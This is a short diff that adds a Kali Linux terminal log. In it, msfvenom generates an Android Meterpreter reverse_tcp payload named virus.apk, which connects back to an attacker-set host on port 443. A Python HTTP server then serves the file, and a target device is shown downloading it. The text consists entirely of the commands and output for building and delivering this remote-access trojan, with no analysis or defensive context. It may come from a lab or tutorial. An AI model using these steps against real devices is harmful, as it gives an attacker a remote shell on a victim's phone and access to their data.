@@ -1,0 +1,16 @@
+                                                                                         
+┌──(root㉿kali)-[/home/whp]
+└─# msfvenom -p android/meterpreter/reverse_tcp LHOST=yourlocalIP LPORT=443 -o virus.apk
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder specified, outputting raw payload
+Payload size: 10239 bytes
+Saved as: virus.apk
+                                                                                         
+┌──(root㉿kali)-[/home/whp]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+targetIP - - [10/Jan/2025 05:21:18] "GET / HTTP/1.1" 200 -
+targetIP - - [10/Jan/2025 05:21:19] code 404, message File not found
+targetIP - - [10/Jan/2025 05:21:19] "GET /favicon.ico HTTP/1.1" 404 -
+targetIP - - [10/Jan/2025 05:21:22] "GET /virus.apk HTTP/1.1" 200 -
